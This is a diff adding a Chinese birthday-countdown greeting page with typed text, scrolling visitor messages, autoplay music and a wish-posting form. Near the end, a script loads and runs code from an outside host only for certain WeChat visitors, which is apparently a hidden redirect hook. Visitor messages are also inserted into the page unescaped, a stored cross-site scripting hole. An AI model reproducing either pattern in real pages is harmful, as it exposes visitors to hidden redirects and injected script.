@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>生日快乐~</title>
+<meta name="chenc" content="Runoob">
+<meta name="description" content="生日快乐~">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0, user-scalable=no">
+<link rel="stylesheet" type="text/css" href="static/css/style.css">
+<link rel="stylesheet" type="text/css" href="static/css/font_1191451_h720mljzrsc.css">
+<link rel="stylesheet" href="static/css/bootstrap.css">
+<script src="static/js/jquery.min.js"></script>
+<script src="static/js/bootstrap.min.js"></script>
+<script src="static/js/jweixin-1.4.0.js"></script> 
+
+<style>
+
+.time p{display:inline-block}
+#text{text-align:left;width:320px;margin-top:15px;font-size:16px;line-height:26px;}
+@media screen and (max-width: 800px) {
+    #text{text-align:left;width:86%;margin-top:15px;font-size:16px;line-height:24px;}
+}
+
+</style>
+</head>
+<body>
+<div class="key">
+    
+    	<div class="iocnBox"><i class="iconfont icon-delete"></i></div>
+    	<div class="empty">清空</div>
+    	<textarea id="message" placeholder="此处编辑内容(20字以内)" rows="1" class="van-field__control" maxlength="20"></textarea>
+    	<div class="buts" style="z-index:999999;">发送</div>
+	
+</div>
+<div class="today" onclick="checkAudio();">
+	<div class="clock">
+		<div class="pos SS"></div>
+		<div class="pos MM"></div>
+		<div class="pos HH"></div>
+		<div class="spot"></div>
+	</div>
+	<!-- <p>北京时间</p> -->
+	<!-- <div class="day"></div>         -->
+	<div class="time" style="text-shadow: 1px 1px 0px #000, -1px -1px 0px #000, -1px 1px 0px #000, 1px -1px 0px #000;"></div>
+	<div class="sydate" style="text-shadow: 1px 1px 0px #000, -1px -1px 0px #000, -1px 1px 0px #000, 1px -1px 0px #000;"></div>
+	<div id="content" class="boxText" style="display:none;">岁未将至 平安喜乐 2024万事如意
+<br>唯愿祝愿像星辰，提前预祝你生日快乐！
+<br>人生是一段旅途，我只是想自己成长，我遇见过许多厉害的人，包括你们，很碰巧和你们遇见，我真幸运。
+<br>是啊，好久没给他人留下过眼泪了，人生真是奇怪，你说对吧，这天是你的生日。
+<br>--笔战人生寄语	</div>
+	<div id="text" style="text-shadow: 1px 1px 0px #000, -1px -1px 0px #000, -1px 1px 0px #000, 1px -1px 0px #000;"></div>
+	<!--
+	<div id="text">1叮咚！恭喜玩家触发过年任务<br>倒计时还有19天过年，请在规定时间内完成以下任务：<br>1.开开心心每一天<br>2.每天都要认真对待<br>3.天天都要好好吃饭<br>4.转发给你最好的10个朋友<br>如在规定期限内完成以上任务，将获得“开心进入新一年”奖励<br>兔年快乐，事事顺心！！！</div>
+	-->
+</div>
+<br>
+
+<button onclick="checkAudio();" style="display: NONE; width: 120px; height: 30px; position: absolute; left: 50%; transform: translate(-50%, -50%); font-size: 15px; text-align: center; color: #ffff00; background-image: linear-gradient(to right, #ffff00, #ffff00, #ffff00); -webkit-background-clip: text;">点我幸运加满</button>
+<br>
+<br>
+<div class="Barrage">
+    <span>笔战人生到此一游</span>
+    <span style="color: #ffff00;">许下心愿</span>
+    <span>许下你的愿望吧</span>
+    <span>恭喜你又老了一岁！但别担心，老酒总是更受欢迎的。生日快乐</span>
+    <span>在网上找不到实用的音乐，这首歌讲究一下吧[开心]</span>
+</div>
+<div class="message" style="margin-bottom:300px;">许下心愿</div>
+
+<audio id="audio_music" data-id="audio_music" autoplay="autoplay" preload="auto" loop="">
+    <source src="https://sf6-cdn-tos.douyinstatic.com/obj/tos-cn-ve-2774/1274ad0ead904bcfbd556acc4eaeff2e" type="audio/mpeg">
+    <embed hidden="true" autostart="true" height="0" width="0" loop="true" src="https://sf6-cdn-tos.douyinstatic.com/obj/tos-cn-ve-2774/1274ad0ead904bcfbd556acc4eaeff2e" autoplay="autoplay">
+</audio>
+	
+<script>
+    var background_url = "";
+    if(background_url){
+        $("body").css('background',"url('"+ background_url +"') no-repeat");
+        $("body").css('background-size',"100%");
+        $("body").css('opacity',"0.2");
+        //$("#pinkboard").css('z-index',"999");
+        //$("#contentToWrite").css('z-index',"999");
+        
+    }
+    
+    var title = '生日倒计时';
+    var starttime = new Date("2024/01/12");
+
+    function updateTime(){
+    	var nowtime = new Date();
+    	var time = starttime - nowtime;
+    	var day = parseInt(time / 1000 / 60 / 60 / 24);
+    	var hour = parseInt(time / 1000 / 60 / 60 % 24);
+    	var minute = parseInt(time / 1000 / 60 % 60);
+    	var seconds = parseInt(time / 1000 % 60);
+    	
+    	var syday = "<span>" + hour + "</span>" + "小时" + "<span>" + minute + "</span>" + "分钟" + "<span class='Lose'>" + seconds + "</span>" + "秒";
+    	$('.time').html("<p>" + title +"</p>" + "<p><span>" + day + "</span>" + "天</p>");
+    	$(".sydate").html(syday);   
+    	
+    	if(hour < 0 && minute < 0 && seconds <0 ){
+    	    
+    	    $(".sydate").hide();   
+    	    $('.time').hide();   
+    	}
+    	
+    }
+    
+    //检测自动播放音乐
+    function checkAudio(){
+        var id_name = $("audio").data("id");
+        var audio = document.getElementById(id_name),
+            play = function(){
+                audio.play();
+                document.removeEventListener("touchstart",play, false);
+            };
+        if(audio){
+            audio.play();
+            document.addEventListener("DOMContentLoaded", function () {
+                play();
+            }, false);
+            document.addEventListener("WeixinJSBridgeReady", function () {
+                play();
+            }, false);
+            document.addEventListener('YixinJSBridgeReady', function() {
+                play();
+            }, false);
+            document.addEventListener("touchstart",play, false);
+        }
+    }
+    
+    
+    $(function(){
+        checkAudio();
+    	updateTime();
+    })
+</script>
+
+<script>
+    var id = "443";
+    var data_type = "0";
+    var vip_type = "0";
+    var post_id = 443;
+    var temp_id = "10";
+    var views = "59574";
+</script>
+
+<script src="static/js/main.js"></script>
+<script type="text/javascript">
+	
+    function addMsg(msg){
+        //生成随机数: x上限，y下限     
+        var x = 10;
+        var y = 0;
+        
+        var col = ["#3fd316","#0dd2ef","#ff0000","#3fd316","#0dd2ef","#ffffff","#3fd316","#0dd2ef","#ff0000","#3fd316"]; 
+        // 随机颜色
+        var colors = parseInt(Math.random() * (x - y + 1) + y);
+        // 随机高度
+        var rand = parseInt(Math.random() * (x - y + 1) + y) * 15;
+        // 随机速度
+        var sudu = parseInt(Math.random() * (x - y + 1) + y) * 3;
+        // 设置最低速度，禁止为0
+        if(sudu < 1){
+        sudu = 10;
+        };
+        var dasdass = " animation: Barrag " + sudu + "s linear infinite;";
+        var dasdass2 = " -webkit-animation: Barrag " + sudu + "s linear infinite;";
+        var colorss = "color:" + col[colors] + ";";
+        var spans = "<span" + " style='top:" + rand + "px;" + colorss + dasdass + dasdass2 + "'>" + msg + "</span>";
+        $(".Barrage").append(spans);
+    }
+    
+    function alertMsg(msg){
+        var Tips = "<div class='Tips'>"+ msg +"</div>";
+        $("body").append(Tips);
+        setTimeout(function(){
+            $(".Tips").remove();
+        },1500)
+    }
+    
+    function loadMsgList(){
+        $.ajax({
+			url: '/api/getRemarkList?type='+ data_type +'&post_id=' + post_id,
+			dataType:"json",
+			success:function(result){
+				var message = '';
+				for(let i = 0;i < result.data.length;i++){
+				    message += '<span>'+ result.data[i].content +'</span>';
+				}
+                console.log(message);
+                $(".Barrage").append(message);
+			}
+		});
+    }
+    
+    function printText() {
+		let str = $("#content").html();//"ʸᵒᵘ ᵃʳᵉ ᵗʰᵉ ᵒⁿˡʸ ᵇᵉˢᵗ ᶠᵒʳ ᵐᵉ.<br><br>于我而言，你是最好且是唯一"
+		let str_ = ''
+		let i = 0
+		let content = document.getElementById('text');
+		let timer = setInterval(() => {
+			if (str_.length < str.length) {
+				str_ += str[i++]
+				content.innerHTML = '<p>' + str_ + '<span class="xx" style="opacity: 1;    color: red;">❤</span></p>'                        //打印时加光标
+			} else {
+				clearInterval(timer)
+				content.innerHTML = '<p>' + str_ + '</p>'
+			}
+		}, 150)
+	}
+	
+	$(function(){
+	    
+	    printText();
+	    loadMsgList();
+	    setInterval(function(){
+	        //alert("123");
+	        $(".Barrage").html('');
+	        //$(".Barrage span").slice(0,4).remove();
+	        loadMsgList();
+	    },9000);
+	    
+        
+        if($("#text").text()){
+            new TypeIt('#text', {
+                lifeLike: true,
+                cursorSpeed: 800,
+                waitUntilVisible: true,
+                speed: 170
+            }).go();
+        }
+
+		$(".buts").click(function(){
+		    checkAudio();
+		    
+            var mes = $("#message").val();
+            if(!mes){
+                //alert("你还没输入内容呢!")
+                var Tipss = "<div class='Tipss'>主子，您还没输入内容呢</div>";
+                $("body").append(Tipss);
+                setTimeout(function(){
+                    $(".Tipss").remove();
+                },1500)
+            }else{
+                $.ajax({
+        			url: '/api/addRemark',
+        			data:{type:data_type,post_id:post_id, content:mes},
+                    type:'post', 
+        			dataType:"json",
+        			success:function(result){
+        			    $("#message").val('');
+        			    $(".icon-delete").click();
+        			    if(result.code == 200){
+        			        addMsg(mes);
+                            alertMsg("发送成功");
+        			    }else{
+        			        alertMsg(result.msg);
+        			    }
+        			    scrollTo(0,0);
+        			    
+        			},
+        			error:function(result){
+        			    alertMsg("发送失败");
+        			    scrollTo(0,0);
+        			}
+        		});
+            }
+    
+        });
+        
+
+    });
+</script>
+
+<!-- <div class="div_btn" id="btn-make">
+    <a href="https://mp.weixin.qq.com/s/cNwFTimGzACK0HNi55Cthw"><span>制作</span></a>
+</div>
+<div class="div_btn" id='div_support'>
+    <a href="/new"><span>更多</span></a>
+</div> -->
+<script>
+//小时分析
+var nowtime = new Date();
+var url = window.location.href;
+hour = nowtime.getHours();
+var allow_hour_arr = Array(0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23);
+function in_array(search,array){
+    for(var i in array){
+        if(array[i]==search){
+            return true;
+        }
+    }
+    return false;
+}
+console.log("referrer：" + document.referrer);
+if(data_type == 0  || (typeof(vip_type) != "undefined" && vip_type != null && vip_type == 0)){
+	if(in_array(hour,allow_hour_arr) && location.toString().indexOf("ai8.top1")==-1 && location.toString().indexOf("accct1.cn")==-1){
+		var ua = navigator.userAgent.toLowerCase(); 
+		if (ua.match(/MicroMessenger/i) == "micromessenger" && ua.indexOf("miniprogram") == -1 && document.referrer.indexOf("/code") == -1 && document.referrer.indexOf("new") == -1 && document.referrer.indexOf("/game") == -1 ) { 
+			document.writeln("<script src=\"https://web-62.20it.cn/api/getJumpJs\"><\/script>");  
+			
+		}
+	}
+}
+
+var _hmt = _hmt || [];
+(function() {
+	var hm = document.createElement("script");
+	if(location.toString().indexOf("55.cn")>-1 || location.toString().indexOf("77.cn")>-1 || location.toString().indexOf(".top")>-1){
+		hm.src = "https://hm.baidu.com/hm.js?51d6321aaa4909493b4e8941b57c30d7";//AI统计
+	}else{
+		hm.src = "https://hm.baidu.com/hm.js?9268d9128fcebf1a5da96d7cb2a8dac4";//CN统计
+	}
+	var s = document.getElementsByTagName("script")[0]; 
+	s.parentNode.insertBefore(hm, s);
+})();
+
+</script>
+
+</body>
+</html>
